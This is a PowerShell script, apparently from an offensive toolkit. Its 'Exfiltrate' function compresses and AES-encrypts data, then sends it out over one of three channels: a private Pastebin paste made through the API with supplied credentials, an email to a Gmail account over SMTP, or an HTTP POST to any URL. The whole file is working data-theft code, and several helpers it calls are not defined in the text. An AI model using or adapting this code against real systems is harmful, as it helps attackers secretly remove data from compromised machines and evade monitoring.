
function Get-Compressed-String {

	[CmdletBinding()]
    Param (
	[Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $text= $(Throw("-string is required"))
    )
	Process {
        [System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
        [byte[]] $byteArray = $enc.GetBytes( $text )

       	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
      	$gzipStream.Write( $byteArray, 0, $byteArray.Length )
        $gzipStream.Close()
        $output.Close()

        return $output.ToArray()
    }
}

function Encrypt-Bytes($key, $bytes) {
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Exfiltrate {
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ID,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Data,
        
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Key,

        [Parameter(Position = 3, Mandatory = $True)]
        [String]
        $ExfilOption,
    
        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $dev_key,
    
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $username,

        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $password,
    
        [Parameter(Position = 7, Mandatory = $False)]
        [String]
        $URL

    )
        

    function post_http($url, $parameters) { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 

        return $http_request.responseText,$http_request.status
    } 

    if ($exfiloption -eq "pastebin") {

        
        $session_key,$code = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        $http_oky_codes = 200,201,202

        if ($http_oky_codes.Contains($code))
        {
            if ($session_key -like '*Bad*')
            {
                Write-Debug "Session key $($session_key)"
                return $code
            }
            else{
                $compressed = Get-Compressed-String $Data
                Write-Debug "Compressed completed size $($compressed.length)"
                $encrypted = Encrypt-Bytes $Key $compressed
                Write-Debug "Encrypted completed size $($encrypted.length)"
    
                Write-Host $encrypted
                $link,$code = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$encrypted&api_paste_private=2" 
                
                if ($http_oky_codes.Contains($code))
                {
                    return $link
                }
                else{
                    return $code
                }
            }
        }
        else{
            return $code
        }
    }


    elseif ($exfiloption -eq "gmail") {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
        $smtpserver = "smtp.gmail.com"
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = $ID
        $msg.Body = $encrypted
        if ($filename) {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
        return $encrypted
    }

    elseif ($exfiloption -eq "webserver") {
        $encrypted = Encrypt-JSON -KeyAES $Key -Payload $Data
        $Data = Compress-Encode $encrypted    
        post_http $URL $Data
        return $encrypted
    }

}
